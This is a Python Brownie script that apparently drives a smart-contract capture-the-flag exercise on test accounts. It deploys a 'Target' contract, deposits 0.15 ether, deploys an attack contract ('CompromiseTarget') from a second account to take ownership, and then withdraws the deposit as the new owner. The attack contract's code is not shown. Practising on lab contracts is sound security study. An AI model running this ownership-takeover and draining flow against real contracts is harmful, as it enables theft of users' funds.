from brownie import Target, CompromiseTarget, config, network, accounts
from scripts.helpful_scripts import get_account
from web3 import Web3


def deploy():
    """
    Deploy target contract
    """
    account = get_account()
    contract = Target
    print("Deploying contract...")
    contract.deploy(
        {"from": account},
        publish_source=config["networks"][network.show_active()].get("verify", False),
    )
    get_owner()


def deposit(amount):
    """Deposit funds to target contract.
    These will be the funds the attacker drains after gaining
    ownership of the contract.
        Params:
            amount:
                amount to deposit denominated in ether.
    """
    account = get_account()
    contract = Target[-1]
    contract.deposit({"value": Web3.toWei(amount, "ether"), "from": account})


def withdraw(amount):
    """
    Withdraw funds from the target contract.
    This function can only be called by the contract owner.
    Call this function once the adversary has gained ownership.

        Params:
            amount:
                amount to be withdrawn from contract denominated in ether
    """
    account = get_account(id="test_acct_2")
    contract = Target[-1]
    contract.withdraw(Web3.toWei(amount, "ether"), {"from": account})


def get_owner():
    """Returns current owner of the contract"""
    contract = Target[-1]
    print(f"Contract owner: {contract.owner()}")
    print(f"Contract balance: {Web3.fromWei(contract.getBalance(), 'ether')} ether")


def alpha():
    """
    Deploy attack contract from seperate account
    """
    account2 = get_account(id="test_acct_2")
    # Contract address to be passed into the adversary contract constructor
    telephone_address = Target[-1].address
    hacker_contract = CompromiseTarget
    hacker_contract.deploy(
        telephone_address,
        {"from": account2},
        publish_source=config["networks"][network.show_active()].get("verify", False),
    )
    get_owner()


def main():
    deploy()
    deposit(0.15)
    alpha()
    withdraw(0.15)
